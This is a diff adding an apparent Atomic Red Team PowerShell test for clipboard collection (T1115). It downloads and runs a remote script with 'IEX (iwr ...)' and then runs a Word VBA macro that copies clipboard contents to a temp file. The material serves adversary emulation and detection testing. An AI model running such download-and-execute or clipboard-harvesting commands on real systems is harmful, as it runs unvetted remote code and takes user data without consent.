@@ -1,0 +1,18 @@
+#TechniqueName: Clipboard Data
+#AtomicTestName: Collect Clipboard Data via VBA
+#Description: This module copies the data stored in the user's clipboard and writes it to a file, $env:TEMP\atomic_T1115_clipboard_data.txt&
+#Language: ps1
+
+#get_prereq_commands
+Write-Host "You will need to install Microsoft Word manually to meet this requirement"
+
+
+#commands
+Set-Clipboard -value "Atomic T1115 Test, grab data from clipboard via VBA"
+IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1115\src\T1115-macrocode.txt" -officeProduct "Word" -sub "GetClipboard"
+
+
+#cleanup_commands
+Remove-Item "$env:TEMP\atomic_T1115_clipboard_data.txt" -ErrorAction Ignore
+
